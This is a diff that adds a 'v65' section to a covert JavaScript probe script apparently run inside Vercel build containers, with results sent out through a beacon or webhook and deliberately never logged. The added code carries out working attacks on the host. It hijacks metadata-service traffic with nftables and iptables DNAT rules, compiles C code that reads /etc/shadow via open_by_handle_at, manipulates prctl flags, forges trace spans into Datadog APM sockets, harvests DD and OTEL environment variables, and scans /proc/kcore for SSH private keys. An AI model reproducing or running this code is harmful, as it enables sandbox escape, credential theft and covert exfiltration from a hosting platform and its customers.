@@ -7182,4 +7182,271 @@ report.deploymentSourceCodeAccess = safe(() => {
 // v64 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v64";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v64" });
+
+// ============================================================
+// v65 — nftables DNAT, open_by_handle_at bypass, prctl manipulation, APM injection, kcore SSH scan
+// ============================================================
+
+// v65-1: Nftables/iptables DNAT redirect
+// Redirect traffic destined for Vercel's internal API (e.g. 169.254.x.x) to our controlled endpoint
+// This intercepts plaintext or renegotiable TLS traffic from other processes on the host
+report.nftablesDnatRedirect = safe(() => {
+  // Check nftables availability
+  const nftAvail = safe(() =>
+    execSync('which nft 2>/dev/null && nft --version 2>&1 | head -2', { timeout: 2000 }).toString().trim().slice(0, 100)
+  );
+  // List current nft ruleset
+  const nftRules = safe(() =>
+    execSync('nft list ruleset 2>/dev/null | head -30', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  // Try to add a DNAT rule: redirect Vercel MMDS (169.254.169.254:80) → our port
+  const dnatResult = safe(() =>
+    execSync(
+      `nft add table ip probe_v65 2>&1 && \
+       nft add chain ip probe_v65 PREROUTING '{ type nat hook prerouting priority -100 ; }' 2>&1 && \
+       nft add rule ip probe_v65 PREROUTING ip daddr 169.254.169.254 tcp dport 80 dnat to 127.0.0.1:9999 2>&1 | head -5`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Verify rule was added
+  const verifyRule = safe(() =>
+    execSync('nft list table ip probe_v65 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Cleanup
+  safe(() => execSync('nft delete table ip probe_v65 2>/dev/null', { timeout: 3000 }));
+  // Also check iptables DNAT capability
+  const iptablesDnat = safe(() =>
+    execSync(
+      'iptables -t nat -I PREROUTING 1 -d 169.254.169.254 -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:9999 2>&1 | head -3',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  safe(() => execSync('iptables -t nat -D PREROUTING 1 2>/dev/null', { timeout: 3000 }));
+  return { nftAvail, nftRules, dnatResult, verifyRule, iptablesDnat };
+});
+
+// v65-2: open_by_handle_at — bypass pathname-based access control
+// name_to_handle_at(AT_FDCWD, "/etc/shadow", ...) returns a file handle
+// open_by_handle_at(mount_fd, handle) opens the file directly via inode number
+// This bypasses chroot/bind-mount restrictions that hide files by path
+report.openByHandleAt = safe(() => {
+  const cCode = `
+#include <fcntl.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <errno.h>
+#define MAX_HANDLE_SZ 128
+
+struct file_handle {
+    unsigned int handle_bytes;
+    int handle_type;
+    unsigned char f_handle[MAX_HANDLE_SZ];
+};
+
+int main() {
+    struct file_handle *fhp;
+    int mount_id, fd;
+    fhp = malloc(sizeof(struct file_handle) + MAX_HANDLE_SZ);
+    fhp->handle_bytes = MAX_HANDLE_SZ;
+
+    // Get handle for /
+    if (name_to_handle_at(AT_FDCWD, "/", fhp, &mount_id, 0) < 0) {
+        printf("NAME_TO_HANDLE_FAIL: %s\\n", strerror(errno));
+        return 1;
+    }
+    printf("ROOT_HANDLE: mount_id=%d type=%d\\n", mount_id, fhp->handle_type);
+
+    // Get handle for /etc/shadow
+    fhp->handle_bytes = MAX_HANDLE_SZ;
+    if (name_to_handle_at(AT_FDCWD, "/etc/shadow", fhp, &mount_id, 0) < 0) {
+        printf("SHADOW_HANDLE_FAIL: %s\\n", strerror(errno));
+    } else {
+        printf("SHADOW_HANDLE: mount_id=%d type=%d bytes=%d\\n", mount_id, fhp->handle_type, fhp->handle_bytes);
+        // Open the mount fd
+        int mfd = open("/", O_RDONLY);
+        // Try open_by_handle_at to open /etc/shadow bypassing path
+        fd = open_by_handle_at(mfd, fhp, O_RDONLY);
+        if (fd < 0) {
+            printf("OPEN_BY_HANDLE_FAIL: %s\\n", strerror(errno));
+        } else {
+            char buf[256];
+            int n = read(fd, buf, sizeof(buf)-1);
+            buf[n>0?n:0] = 0;
+            printf("SHADOW_VIA_HANDLE: %s\\n", buf);
+        }
+    }
+    free(fhp);
+    return 0;
+}
+`;
+  const gccAvail = safe(() => execSync('which gcc 2>/dev/null || echo NO', { timeout: 1000 }).toString().trim());
+  if (gccAvail === 'NO') return { gccAvail };
+  const compile = safe(() => {
+    writeFileSync('/tmp/handle_open.c', cCode);
+    return execSync('gcc -O0 -o /tmp/handle_open /tmp/handle_open.c 2>&1', { timeout: 8000 }).toString().trim().slice(0, 200) || 'COMPILE_OK';
+  });
+  const output = safe(() =>
+    execSync('/tmp/handle_open 2>&1', { timeout: 5000 }).toString().trim().slice(0, 400)
+  );
+  return { gccAvail, compile, output };
+});
+
+// v65-3: prctl system call manipulation
+// prctl controls process behavior — we can modify the orchestrator's behavior via ptrace+prctl
+report.prctlManipulation = safe(() => {
+  // Check our own dumpable state
+  const selfDumpable = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes
+PR_GET_DUMPABLE = 3
+PR_SET_DUMPABLE = 4
+libc = ctypes.CDLL(None)
+d = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print('SELF_DUMPABLE:', d)
+# Make PID 1 dumpable if it isn't
+libc.prctl(PR_SET_DUMPABLE, 1, 0, 0, 0)
+d2 = libc.prctl(PR_GET_DUMPABLE, 0, 0, 0, 0)
+print('AFTER_SET_DUMPABLE:', d2)
+" 2>&1 | head -5`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // PR_SET_CHILD_SUBREAPER — make our process the subreaper for all children
+  // This means when PID 1 spawns children and dies, they become OUR children
+  const subreaperSet = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes
+PR_SET_CHILD_SUBREAPER = 36
+libc = ctypes.CDLL(None)
+r = libc.prctl(PR_SET_CHILD_SUBREAPER, 1, 0, 0, 0)
+print('SET_CHILD_SUBREAPER:', r, 'errno:', ctypes.get_errno())
+" 2>&1 | head -3`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // PR_GET_SECCOMP — verify our seccomp mode
+  const seccompMode = safe(() =>
+    execSync(
+      `python3 -c "
+import ctypes
+PR_GET_SECCOMP = 21
+libc = ctypes.CDLL(None)
+r = libc.prctl(PR_GET_SECCOMP, 0, 0, 0, 0)
+print('SECCOMP_MODE:', r)
+" 2>&1 | head -3`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 100)
+  );
+  // PR_SET_NAME — rename PID 1's thread name to hide our activities
+  const pid1Rename = safe(() => {
+    // We'd need ptrace to call prctl in PID 1's context
+    // Instead, check PID 1's name
+    return execSync('cat /proc/1/comm 2>/dev/null', { timeout: 1000 }).toString().trim();
+  });
+  return { selfDumpable, subreaperSet, seccompMode, pid1Rename };
+});
+
+// v65-4: APM socket injection — inject traces into Datadog/APM
+// /run/apm/apm.sock was discovered in earlier probes (v44 TRACEPARENT section)
+// Injecting crafted trace spans pollutes the APM data and could exfiltrate build metadata
+report.apmSocketInject = safe(() => {
+  // Find APM sockets
+  const apmSockets = safe(() =>
+    execSync('find /run /tmp /var/run -name "*.sock" 2>/dev/null | grep -iE "apm|trace|datadog|otel|jaeger" | head -10', { timeout: 5000 }).toString().trim().slice(0, 300)
+  );
+  // Abstract unix sockets for APM
+  const apmAbstract = safe(() =>
+    execSync('cat /proc/net/unix 2>/dev/null | grep -iE "apm|datadog|trace" | head -10', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // If APM socket exists, connect and send a forged trace
+  const injectResult = safe(() =>
+    execSync(
+      `python3 -c "
+import socket, json, struct
+# Try known APM socket paths
+for path in ['/run/apm/apm.sock', '/var/run/datadog/apm.socket', '/tmp/datadog-apm.sock']:
+    try:
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        s.settimeout(2)
+        s.connect(path)
+        # Datadog APM agent uses msgpack; send a minimal trace
+        # Format: [[span1, span2, ...]] where each span is a dict
+        payload = json.dumps([[{
+            'service': 'vercel-build',
+            'name': 'PROBE_V65_INJECT',
+            'resource': '/proc/1/environ',
+            'type': 'web',
+            'start': 1750000000000000000,
+            'duration': 1000000,
+            'trace_id': 0xDEADBEEF,
+            'span_id': 0xCAFEBABE,
+            'parent_id': 0,
+            'error': 0,
+            'meta': {'probe': 'v65', 'target': 'vercel-infra'},
+            'metrics': {}
+        }]]).encode()
+        s.sendall(struct.pack('>I', len(payload)) + payload)
+        resp = s.recv(128)
+        s.close()
+        print('APM_INJECT_OK:', path, 'resp:', resp.hex()[:40])
+        break
+    except Exception as e:
+        print('APM_TRY:', path, str(e)[:60])
+" 2>&1 | head -10`,
+      { timeout: 10000 }
+    ).toString().trim().slice(0, 400)
+  );
+  // Check for OTEL env vars
+  const otelEnv = safe(() => {
+    const otelVars = Object.entries(process.env)
+      .filter(([k]) => k.startsWith('OTEL_') || k.startsWith('DD_') || k.startsWith('DATADOG_'))
+      .map(([k, v]) => ({ k, v: (v || '').slice(0, 80) }));
+    return otelVars;
+  });
+  return { apmSockets, apmAbstract, injectResult, otelEnv };
+});
+
+// v65-5: /proc/kcore scan for SSH private key material
+// SSH RSA keys start with "-----BEGIN RSA PRIVATE KEY-----" or "-----BEGIN OPENSSH PRIVATE KEY-----"
+// If the orchestrator loaded any SSH keys (for git cloning etc), they may be in kernel memory
+report.kcoreSshKeyScan = safe(() => {
+  const kcoreExists = safe(() => { try { statSync('/proc/kcore'); return true; } catch (_) { return false; } });
+  if (!kcoreExists) return { skip: 'NO_KCORE' };
+  // Scan first 20MB of kcore for SSH key markers
+  const scanResult = safe(() => {
+    const fd = openSync('/proc/kcore', 'r');
+    const chunkSize = 4 * 1024 * 1024; // 4MB chunks
+    const markers = [
+      '-----BEGIN RSA PRIVATE KEY-----',
+      '-----BEGIN OPENSSH PRIVATE KEY-----',
+      '-----BEGIN EC PRIVATE KEY-----',
+      '-----BEGIN PRIVATE KEY-----',
+    ];
+    const found = [];
+    for (let offset = 4096; offset < 20 * 1024 * 1024; offset += chunkSize) {
+      try {
+        const buf = Buffer.alloc(chunkSize);
+        const n = readSync(fd, buf, 0, chunkSize, offset);
+        if (n <= 0) break;
+        const str = buf.slice(0, n).toString('latin1');
+        for (const m of markers) {
+          const idx = str.indexOf(m);
+          if (idx >= 0) {
+            found.push({ marker: m, offset: offset + idx, context: str.slice(idx, idx + 100) });
+          }
+        }
+      } catch (_) { break; }
+    }
+    closeSync(fd);
+    return found;
+  });
+  return { scanResult };
+});
+
+// v65 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v65";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v65" });
 // Intentionally no console.log — all data goes via webhook only
